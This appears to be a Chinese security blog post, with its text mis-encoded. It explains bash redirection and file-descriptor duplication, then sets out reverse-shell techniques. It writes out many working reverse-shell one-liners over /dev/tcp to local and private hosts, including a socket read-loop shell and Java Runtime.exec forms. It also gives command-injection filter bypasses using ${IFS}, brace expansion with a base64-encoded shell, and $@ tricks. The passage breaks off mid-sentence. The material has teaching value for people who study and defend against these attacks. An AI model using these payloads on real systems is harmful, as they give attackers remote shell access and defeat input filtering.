    <content type="html"><![CDATA[<h2 id="ÈáçÂÆöÂêë"><a href="#ÈáçÂÆöÂêë" class="headerlink" title="ÈáçÂÆöÂêë"></a>ÈáçÂÆöÂêë</h2><p>ÁÆÄÂçïËÆ∞ÂøÜ: </p><ul><li><code>&gt;</code>ÂèØÂú®<code>&amp;</code>Ââç„ÄÅÂêé</li><li><code>&lt;</code>Âè™ËÉΩÂú®<code>&amp;</code>Ââç</li></ul><h3 id="1-ËæìÂÖ•ÈáçÂÆöÂêë"><a href="#1-ËæìÂÖ•ÈáçÂÆöÂêë" class="headerlink" title="1. ËæìÂÖ•ÈáçÂÆöÂêë"></a>1. ËæìÂÖ•ÈáçÂÆöÂêë</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828004794955.jpg" alt="-w693"></p><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ cat < test_fileHello World~</code></pre><h3 id="2-ËæìÂá∫ÈáçÂÆöÂêë"><a href="#2-ËæìÂá∫ÈáçÂÆöÂêë" class="headerlink" title="2. ËæìÂá∫ÈáçÂÆöÂêë"></a>2. ËæìÂá∫ÈáçÂÆöÂêë</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828006043413.jpg" alt="-w693"></p><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ echo 'Hello World~' > test_file test@test:/tmp$ cat test_file Hello World~</code></pre><h3 id="3-Ê†áÂáÜËæìÂá∫‰∏éÊ†áÂáÜÈîôËØØËæìÂá∫ÈáçÂÆöÂêë"><a href="#3-Ê†áÂáÜËæìÂá∫‰∏éÊ†áÂáÜÈîôËØØËæìÂá∫ÈáçÂÆöÂêë" class="headerlink" title="3. Ê†áÂáÜËæìÂá∫‰∏éÊ†áÂáÜÈîôËØØËæìÂá∫ÈáçÂÆöÂêë"></a>3. Ê†áÂáÜËæìÂá∫‰∏éÊ†áÂáÜÈîôËØØËæìÂá∫ÈáçÂÆöÂêë</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828006688727.jpg" alt="-w692"></p><pre class=" language-shell"><code class="language-shell">// bash 1test@test:/tmp$ bash -i &> test// bash 2test@test:~$ ls -l /proc/5693/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  27 19:00 0 -> /dev/pts/2l-wx------ 1 test test 64 2Êúà  27 19:00 1 -> /tmp/testl-wx------ 1 test test 64 2Êúà  27 19:00 2 -> /tmp/testlrwx------ 1 test test 64 2Êúà  27 19:00 255 -> /dev/tty</code></pre><h3 id="4-Êñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÂ§çÂà∂"><a href="#4-Êñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÂ§çÂà∂" class="headerlink" title="4. Êñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÂ§çÂà∂"></a>4. Êñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÂ§çÂà∂</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828014944337.jpg" alt="-w836"></p><p>Ê≥®ÊÑèÔºö</p><ol><li>‰∏§ÁßçÂΩ¢ÂºèÈÉΩÊòØÂ∞Ü word Â§çÂà∂Áªô n</li><li>Âú®Á¨¨‰∫åÁßçÂΩ¢Âºè<code>&gt;&amp;</code>ÊúÄÂêéÁöÑÊèèËø∞‰∏≠ÔºåÂ¶ÇÊûúÊ≤°ÊúâÊåáÂÆö<code>n</code>Ôºå‰∏î<code>word</code>Êó†Ê≥ïËß£ÈáäÊàê<code>Êï¥Êï∞</code>Êàñ<code>-</code>ÔºåÂàôÊ≠§ÂëΩ‰ª§‰ºöË¢´Ëß£Èáä‰∏∫<code>Ê†áÂáÜËæìÂá∫‰∏éÊ†áÂáÜÈîôËØØËæìÂá∫ÈáçÂÆöÂêë</code></li></ol><p>Ê†πÊçÆÊ≠§‰∏§ÁÇπÔºåÂ¶ÇÊûú<strong>n‰∏∫Êï∞Â≠óÔºåÂàôËß£Êûê‰∏∫<code>Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂</code></strong></p><hr><p>ËøôÈáåËøòÈúÄË¶ÅÂ∞Ü<code>Êñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÂ§çÂà∂</code>‰∏é<code>Ê†áÂáÜËæìÂá∫‰∏éÊ†áÂáÜÈîôËØØËæìÂá∫ÈáçÂÆöÂêë</code>ÊãøÂá∫Êù•ÊØîËæÉ‰∏ÄÁï™ÔºåÊ≥®ÊÑè‰∏ãÈù¢<code>&gt;&amp;5</code>‰∏é<code>&amp;&gt;5</code>ÁöÑÂå∫Âà´</p><p>Âç≥<code>&amp;</code>ÊòØÂê¶Á¥ßË∑üÊï∞Â≠ó<code>n</code>Ôºå‰ºöÂå∫ÂàÜ‰∏∫<code>Êñá‰ª∂ÊèèËø∞Á¨¶n</code>Âíå<code>Êñá‰ª∂n</code></p><ul><li><code>&gt;&amp;5</code> -&gt; Â∞Ü<code>Êñá‰ª∂ÊèèËø∞Á¨¶5</code>Â§çÂà∂Áªô<code>stdout</code></li><li><code>&amp;&gt;5</code> -&gt; Â∞Ü<code>stdout</code>„ÄÅ<code>stderr</code>ÈáçÂÆöÂêëÂà∞<code>ÂΩìÂâçÁõÆÂΩï‰∏ãÂêç‰∏∫5ÁöÑÊñá‰ª∂</code></li></ul><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ exec 5<>test_file >&5test@test:~$ ls -l /proc/14396/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 14:16 0 -> /dev/pts/0lrwx------ 1 test test 64 2Êúà  29 14:16 1 -> /tmp/test_filelrwx------ 1 test test 64 2Êúà  29 14:16 2 -> /dev/pts/0lrwx------ 1 test test 64 2Êúà  29 14:16 255 -> /dev/pts/0lrwx------ 1 test test 64 2Êúà  29 14:16 5 -> /tmp/test_file---test@test:/tmp$ exec 5<>test_file &>5test@test:~$ ls -l /proc/14396/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 14:16 0 -> /dev/pts/0l-wx------ 1 test test 64 2Êúà  29 14:16 1 -> /tmp/5l-wx------ 1 test test 64 2Êúà  29 14:16 2 -> /tmp/5lrwx------ 1 test test 64 2Êúà  29 14:16 255 -> /dev/pts/0lrwx------ 1 test test 64 2Êúà  29 14:16 5 -> /tmp/test_file</code></pre><h3 id="5-ÊâìÂºÄÊñá‰ª∂ÊèèËø∞Á¨¶ËøõË°åËØªÂÜô"><a href="#5-ÊâìÂºÄÊñá‰ª∂ÊèèËø∞Á¨¶ËøõË°åËØªÂÜô" class="headerlink" title="5. ÊâìÂºÄÊñá‰ª∂ÊèèËø∞Á¨¶ËøõË°åËØªÂÜô"></a>5. ÊâìÂºÄÊñá‰ª∂ÊèèËø∞Á¨¶ËøõË°åËØªÂÜô</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828164328837.jpg" alt="-w841"></p><blockquote><p>ÂΩìexecÂëΩ‰ª§ÂØπÊñá‰ª∂ÊèèËø∞Á¨¶Êìç‰ΩúÁöÑÊó∂ÂÄôÔºåÂ∞±‰∏ç‰ºöÊõøÊç¢shellÔºåËÄåÊòØÊìç‰ΩúÂÆåÊàêÂêéËøò‰ºöÁªßÁª≠ÊâßË°åÂêéÈù¢ÁöÑÂëΩ‰ª§</p></blockquote><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ 5<>filetest@test:/tmp$ ls -l /proc/29753/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 12:04 0 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:04 1 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:04 2 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:04 255 -> /dev/pts/1---test@test:/tmp$ exec 5<>test_filetest@test:/tmp$ ls -l /proc/29753/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 12:04 0 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:04 1 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:04 2 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:04 255 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:04 5 -> /tmp/test_file</code></pre><h2 id="ÂèçÂºπ"><a href="#ÂèçÂºπ" class="headerlink" title="ÂèçÂºπ"></a>ÂèçÂºπ</h2><h3 id="Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂"><a href="#Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂" class="headerlink" title="Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂"></a>Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂</h3><p>ÊúÄÂ∏∏ËßÅÁöÑÊ®°Âºè</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 0<span class="token operator">></span><span class="token operator">&amp;</span>1// ÁúÅÁï•ÈùûÂøÖË¶ÅÁ©∫Ê†º<span class="token function">bash</span> -i<span class="token operator">></span><span class="token operator">&amp;</span>/dev/tcp/127.0.0.1/12345 0<span class="token operator">></span><span class="token operator">&amp;</span>1</code></pre><h3 id="Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂-2"><a href="#Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂-2" class="headerlink" title="Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂ 2"></a>Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂ 2</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 <span class="token operator">&lt;</span><span class="token operator">&amp;</span>1// ÁúÅÁï•ÈùûÂøÖË¶ÅÁ©∫Ê†º<span class="token function">bash</span> -i<span class="token operator">></span><span class="token operator">&amp;</span>/dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1</code></pre><h3 id="ÁªëÂÆöÈáçÂÆöÂêë"><a href="#ÁªëÂÆöÈáçÂÆöÂêë" class="headerlink" title="ÁªëÂÆöÈáçÂÆöÂêë"></a>ÁªëÂÆöÈáçÂÆöÂêë</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">exec</span> 5<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/192.168.146.129/2333<span class="token punctuation">;</span><span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token operator">&amp;</span>5<span class="token operator">|</span><span class="token keyword">while</span> <span class="token function">read</span> line<span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token variable">$line</span> <span class="token operator">></span><span class="token operator">&amp;</span>5 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span class="token punctuation">;</span><span class="token keyword">done</span></code></pre><p>Ê≥®ÊÑè‰∏∫‰ªÄ‰πàÊúÄÂêéÂèàÂä†‰∫Ü‰∏Ä‰∏™<code>2&gt;&amp;1</code>Âë¢ÔºüÂõûÂ§¥ÁúãÁúãÊèèËø∞Á¨¶Â§çÂà∂Ê≥®ÊÑèÁöÑÂú∞ÊñπÔºåÂ∞±Ê∏ÖÊ•ö‰∫Ü</p><hr><p>Âè¶Â§ñ‰∏ãÈù¢‰∏∫‰ªÄ‰πàÊ≤°ÁúãÂà∞<code>ËøõÁ®ã30651ÁöÑbash</code>‰∏≠<code>stdout &amp; stderr</code>Ë¢´ÈáçÂÆöÂêëÊÉÖÂÜµÂë¢ÔºüÂõ†‰∏∫ÊØèÊ¨°<code>do</code>ÈÉΩÊòØÈÄöËøá<strong>Ê≠§bash</strong>Êñ∞ÂºÄÂêØ‰∏Ä‰∏™Â≠êËøõÁ®ãÔºåÂπ∂Âú®Â≠êËøõÁ®ãÂÜÖËøõË°åÊñá‰ª∂ÊèèËø∞Á¨¶ÁöÑËµãÂÄº</p><pre class=" language-shell"><code class="language-shell">test@test:~$ exec 5<>/dev/tcp/127.0.0.1/12345;cat <&5|while read line;do $line >&5 2>&1;done// 29753 ÊâßË°åÂèçÂºπ shell ÂëΩ‰ª§test     29753  4841  0 12:04 pts/1    00:00:00 bashtest     30640  4895  0 12:09 pts/2    00:00:00 nc -lvvp 12345test     30650 29753  0 12:09 pts/1    00:00:00 cattest     30651 29753  0 12:09 pts/1    00:00:00 bash// cattest@test:/tmp$ ls -l /proc/30650/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 12:48 0 -> 'socket:[1487308]'l-wx------ 1 test test 64 2Êúà  29 12:48 1 -> 'pipe:[1487309]'lrwx------ 1 test test 64 2Êúà  29 12:48 2 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:48 5 -> 'socket:[1487308]'// bashtest@test:/tmp$ ls -l /proc/30651/fdÊÄªÁî®Èáè 0lr-x------ 1 test test 64 2Êúà  29 12:48 0 -> 'pipe:[1487309]'lrwx------ 1 test test 64 2Êúà  29 12:48 1 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:48 2 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:48 255 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:48 5 -> 'socket:[1487308]'</code></pre><h4 id="È¢ùÂ§ñÁöÑ‰æãÂ≠ê"><a href="#È¢ùÂ§ñÁöÑ‰æãÂ≠ê" class="headerlink" title="È¢ùÂ§ñÁöÑ‰æãÂ≠ê"></a>È¢ùÂ§ñÁöÑ‰æãÂ≠ê</h4><p><code>&lt;&amp;996 &gt;&amp;996 2&gt;&amp;996</code>ÂàÜÂà´ÂØπÂ∫îÂ§çÂà∂Âà∞<code>stdin stdout stderr</code></p><pre class=" language-shell"><code class="language-shell">0<&996;exec 996<>/dev/tcp/127.0.0.1/12345;sh <&996 >&996 2>&996// ÂèòÂΩ¢exec 996<>/dev/tcp/127.0.0.1/123450 <&996 >&996 2>&996</code></pre><p>Ê≥®ÊÑèÔºöÂèòÂΩ¢ÁöÑÂëΩ‰ª§Âú®ËøûÊé•Á´ØÈÄÄÂá∫‰ºöÂØºËá¥Ê≠§Á´ØÂêåÊó∂ÈÄÄÂá∫ÔºåÂéüÂõ†Â¶Ç‰∏ãÔºö</p><pre class=" language-shell"><code class="language-shell">// 0<&996;exec 996<>/dev/tcp/127.0.0.1/12345;sh <&996 >&996 2>&996test     18999  2516  0 14:44 pts/0    00:00:00 bashtest@test:~$ ls -l /proc/18999/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 14:44 0 -> 'socket:[106812]'lrwx------ 1 test test 64 2Êúà  29 14:44 1 -> 'socket:[106812]'lrwx------ 1 test test 64 2Êúà  29 14:45 196 -> 'socket:[106812]'lrwx------ 1 test test 64 2Êúà  29 14:44 2 -> 'socket:[106812]'lrwx------ 1 test test 64 2Êúà  29 14:44 255 -> /dev/pts/0---// exec 996<>/dev/tcp/127.0.0.1/123450 <&996 >&996 2>&996test     18999  2516  0 14:44 pts/0    00:00:00 bashtest     20566 18999  0 14:53 pts/0    00:00:00 shtest@test:~$ ls -l /proc/18999/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 14:44 0 -> /dev/pts/0lrwx------ 1 test test 64 2Êúà  29 14:44 1 -> /dev/pts/0lrwx------ 1 test test 64 2Êúà  29 14:45 196 -> 'socket:[105103]'lrwx------ 1 test test 64 2Êúà  29 14:44 2 -> /dev/pts/0lrwx------ 1 test test 64 2Êúà  29 14:44 255 -> /dev/pts/0test@test:~$ ls -l /proc/20566/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 14:53 0 -> 'socket:[105103]'lrwx------ 1 test test 64 2Êúà  29 14:53 1 -> 'socket:[105103]'lrwx------ 1 test test 64 2Êúà  29 14:53 196 -> 'socket:[105103]'lrwx------ 1 test test 64 2Êúà  29 14:53 2 -> 'socket:[105103]'</code></pre><h3 id="ÂÖ∂‰ªñ"><a href="#ÂÖ∂‰ªñ" class="headerlink" title="ÂÖ∂‰ªñ"></a>ÂÖ∂‰ªñ</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15829596110947.jpg" alt="https://xz.aliyun.com/t/2549#toc-8"></p><h2 id="ÂèçÂºπ-in-Java"><a href="#ÂèçÂºπ-in-Java" class="headerlink" title="ÂèçÂºπ in Java"></a>ÂèçÂºπ in Java</h2><h3 id="Runtime-getRuntime-exec"><a href="#Runtime-getRuntime-exec" class="headerlink" title="Runtime.getRuntime().exec"></a>Runtime.getRuntime().exec</h3><h4 id="exec-new-String"><a href="#exec-new-String" class="headerlink" title="exec(new String[])"></a>exec(new String[])</h4><p>Âú®Ê≠§Ê®°ÂºèËß£ÊûêÁöÑÂÖ≥ÈîÆÊòØ<code>java.lang.UNIXProcess#UNIXProcess</code>ÔºåÂú®<code>-c</code>Ê®°Âºè‰∏ãÔºåÂèØ‰ª•ÁúãÂà∞ÂèÇÊï∞‰∏∫‰∏§‰∏™</p><p>P.S. ‰∏™‰∫∫ËÆ§‰∏∫ÊòØÂõ†‰∏∫Â¶Ç<code>&gt;&amp;</code>Á≠âÂèÇÊï∞Êó†Ê≥ïË¢´ËØÜÂà´‰∏∫bashÂèÇÊï∞ÔºåÂÆÉÂ∫îÂ±û‰∫éÂΩìÂâç bash ÁéØÂ¢É‰∏ãÁöÑÊìç‰Ωú</p><ol><li><p>Áõ¥Êé•Êï∞ÁªÑÂåñÊó†Ê≥ïËß£ÊûêÔºåËß£ÊûêÂèÇÊï∞‰∏∫ 4 ‰∏™</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816475716996.jpg" alt="-w1640"><br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15840206558058.jpg" alt="-w1005"></p></li><li><p>Êï∞ÁªÑÂåñ with <code>-c</code>ËÉΩÊ≠£Á°ÆËß£ÊûêÔºåËß£ÊûêÂèÇÊï∞‰∏∫ 2 ‰∏™</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816478550627.jpg" alt="-w1680"><br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816487793325.jpg" alt="-w996"></p></li></ol><h4 id="exec-new-String-1"><a href="#exec-new-String-1" class="headerlink" title="exec(new String)"></a>exec(new String)</h4><p>Â¶ÇÊûúÊàë‰ª¨Âè™‰º†ÂÖ•‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Êó∂Ôºå‰ºöÁªèËøá StringTokenizer ÂàÜÂâ≤ÔºåÊ≥®ÊÑè‰ºöËØÜÂà´<strong>‰∫î‰∏™</strong>Â≠óÁ¨¶</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816481561408.jpg" alt="-w537"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816521932598.jpg" alt="-w631"></p><p>ÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÊâæÂà∞‰∏Ä‰∏™Â≠óÁ¨¶ËÉΩÂ§üÁªïËøáÂàÜÂâ≤‰∏îËÉΩË¢´<code>/bin/bash</code>Ê≠£Á°ÆËØÜÂà´‰∏∫Á©∫Ê†º</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="IFS"><a href="#IFS" class="headerlink" title="${IFS}"></a>${IFS}</h3><blockquote><p>‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãÔºå<code>$var</code>‰∏é<code>${var}</code>Âπ∂Ê≤°ÊúâÂï•‰∏ç‰∏ÄÊ†∑„ÄÇ‰ΩÜÊòØÁî®<code>${ }</code>‰ºöÊØîËæÉÁ≤æÁ°ÆÁöÑÁïåÂÆöÂèòÈáèÂêçÁß∞ÁöÑËåÉÂõ¥</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816540712094.jpg" alt="-w489"></p><p>Â¶ÇÊûúÁõ¥Êé•Âà©Áî®‰ºöÊä•Èîô<code>ambiguous redirect(Ê≠ß‰πâÈáçÂÆöÂêë)</code></p><pre class=" language-shell"><code class="language-shell"># Êä•Èîô ambiguous redirectbash-3.2$ bash${IFS}-i${IFS}>&${IFS}/dev/tcp/127.0.0.1/12345${IFS}0>&1bash: ${IFS}/dev/tcp/127.0.0.1/12345${IFS}0: ambiguous redirect# Ê≠£Â∏∏bash-3.2$ bash${IFS}-i${IFS}>&${IFS}/dev/tcp/127.0.0.1/12345 0>&1</code></pre><p>ÈÇ£‰πàÊúÄÂêé‰∏Ä‰∏™Á©∫Ê†ºËØ•Â¶Ç‰ΩïÂ§ÑÁêÜÂë¢ÔºåÊàë‰ª¨ÂèØ‰ª•ÁúãÂà∞ÔºåÁªèËøá<code>&gt;&amp; socks</code>ÂêéÔºåstdou stderr Â∑≤ÁªèË¢´ÈáçÂÆöÂêëÂà∞‰∫Ü socks Êñá‰ª∂ÔºåÊúÄÂêé‰∏ÄÂè•<code>0&gt;&amp;1</code>Â∞±ÊòØËØïÂõæÂ∞Ü stdin ‰πüÈáçÂÆöÂêëËøáÂéª</p><pre class=" language-bash"><code class="language-bash">test@test:~$ <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345test@test:~$ <span class="token function">ls</span> -l /proc/14067/fdÊÄªÁî®Èáè 0lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:05 0 -<span class="token operator">></span> /dev/pts/1lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:05 1 -<span class="token operator">></span> <span class="token string">'socket:[924955]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:05 10 -<span class="token operator">></span> /dev/ttylrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:05 2 -<span class="token operator">></span> <span class="token string">'socket:[924955]'</span></code></pre><p>Ê≥®ÊÑèÂà∞<code>Êñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÂ§çÂà∂</code>‰∏≠<code>[n]&lt;&amp;word</code>Ê†ºÂºèÔºåÊàë‰ª¨ÂèØ‰ª•Â∞Ü socks Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂Âà∞ stdin ‰∏≠</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># Ê∑ªÂä† IFS</span><span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token variable">${IFS}</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token variable">${IFS}</span>/dev/tcp/127.0.0.1/12345<span class="token variable">${IFS}</span>0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1</code></pre><p>ÂêåÊó∂Áî±‰∫é n ÈªòËÆ§‰∏∫ stdinÔºåÈÇ£‰πàÊàë‰ª¨‰πüÂèØ‰ª•Âà©Áî®Ê≠§ËßÑÂàô‰∏çÂá∫Áé∞ 0</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 <span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># Ê∑ªÂä† IFS</span><span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token variable">${IFS}</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token variable">${IFS}</span>/dev/tcp/127.0.0.1/12345<span class="token variable">${IFS}</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span>1</code></pre><p>ÁîöËá≥ÁúÅÁï•ÊúÄÂêéÁöÑÁ©∫Ê†ºÔºå‰ª•ÂèäÈùûÂøÖË¶ÅÁöÑÁ©∫Ê†º</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># Ê∑ªÂä† IFS</span><span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token variable">${IFS}</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token variable">${IFS}</span>/dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># ÁúÅÁï•ÈùûÂøÖË¶ÅÁ©∫Ê†º+IFS ÊµãËØï</span>test@test:~$ <span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token operator">></span><span class="token operator">&amp;</span>/dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1test@test:~$ <span class="token function">ls</span> -l /proc/14556/fdÊÄªÁî®Èáè 0lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:08 0 -<span class="token operator">></span> <span class="token string">'socket:[928815]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:08 1 -<span class="token operator">></span> <span class="token string">'socket:[928815]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:08 2 -<span class="token operator">></span> <span class="token string">'socket:[928815]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2Êúà  27 23:08 255 -<span class="token operator">></span> /dev/tty</code></pre><h3 id="bash-Brace-Expansion"><a href="#bash-Brace-Expansion" class="headerlink" title="bash Brace Expansion"></a>bash Brace Expansion</h3><p>Ëä±Êã¨Âè∑Êâ©Â±ïÔºåËØ¶ÁªÜËßÅÂèÇËÄÉËµÑÊñô 3</p><pre class=" language-shell"><code class="language-shell">test@test:~$ echo hello{'world','linux'},helloworld, hellolinux,test@test:~$ echo hello{1..5},hello1, hello2, hello3, hello4, hello5,</code></pre><pre class=" language-shell"><code class="language-shell">test@test:~$ bash -c "{echo,YmFzaCAtaT4mL2Rldi90Y3AvMTI3LjAuMC4xLzEyMzQ1PCYxCg==}|{base64,-d}|{bash,-i}"Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaT4mL2Rldi90Y3AvMTI3LjAuMC4xLzEyMzQ1PCYxCg==}|{base64,-d}|{bash,-i}");</code></pre><h3 id><a href="#" class="headerlink" title="$@ $*"></a><code>$@</code> <code>$*</code></h3><p>ÁªÜËäÇÂèäÂå∫Âà´ËØ¶ËßÅÔºö<a href="http://c.biancheng.net/cpp/view/2739.html" target="_blank" rel="noopener">ShellÁâπÊÆäÂèòÈáè</a></p><table><thead><tr><th>ÂèÇÊï∞Â§ÑÁêÜ</th><th>ËØ¥Êòé</th></tr></thead><tbody><tr><td><code>$*</code></td><td>‰ª•‰∏Ä‰∏™ÂçïÂ≠óÁ¨¶‰∏≤ÊòæÁ§∫ÊâÄÊúâÂêëËÑöÊú¨‰º†ÈÄíÁöÑÂèÇÊï∞„ÄÇ<br>Â¶Ç<code>$*</code>Áî®<code>&quot;</code>Êã¨Ëµ∑Êù•ÁöÑÊÉÖÂÜµ„ÄÅ‰ª•<code>$1 $2 ‚Ä¶ $n</code>ÁöÑÂΩ¢ÂºèËæìÂá∫ÊâÄÊúâÂèÇÊï∞„ÄÇ</td></tr><tr><td><code>$@</code></td><td>‰∏é<code>$*</code>Áõ∏ÂêåÔºå‰ΩÜÊòØ‰ΩøÁî®Êó∂Âä†ÂºïÂè∑ÔºåÂπ∂Âú®ÂºïÂè∑‰∏≠ËøîÂõûÊØè‰∏™ÂèÇÊï∞„ÄÇ<br>Â¶Ç<code>$@</code>Áî®<code>&quot;</code>Êã¨Ëµ∑Êù•ÁöÑÊÉÖÂÜµ„ÄÅ‰ª•<code>&quot;$1&quot; &quot;$2&quot; ‚Ä¶ &quot;$n&quot;</code>ÁöÑÂΩ¢ÂºèËæìÂá∫ÊâÄÊúâÂèÇÊï∞„ÄÇ</td></tr></tbody></table><p>‰ª•‰∏ãÂÜÖÂÆπÊù•Ëá™</p><p>ÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØ‰ª•Âà©Áî®Êù•ÂèçÂºπshell‰∫Ü„ÄÇÁúãbashËØ≠Ê≥ïÔºö</p><pre class=" language-shell"><code class="language-shell">bash [options] [command_string | file]-c   If the -c option is present, then commands are read from the first non-option argument command_string.If there are arguments after the command_string, they are assigned to the positional parameters, starting with $0.</code></pre><p>ÁªìÂêàbashÂíå$@ÔºåÊàë‰ª¨ÂèØ‰ª•Âèò‰∏∫Ôºö</p><pre class=" language-shell"><code class="language-shell">/bin/sh -c '$@|sh' xxx  echo ls</code></pre><p>ÂèØ‰ª•ÊàêÂäüÂú∞ÊâßË°å<code>ls</code>„ÄÇÂàÜÊûê‰∏ãËøô‰∏™ÂëΩ‰ª§ÔºåÂΩì<code>bash</code>Ëß£ÊûêÂà∞<code>&#39;$@|sh&#39; xxx echo 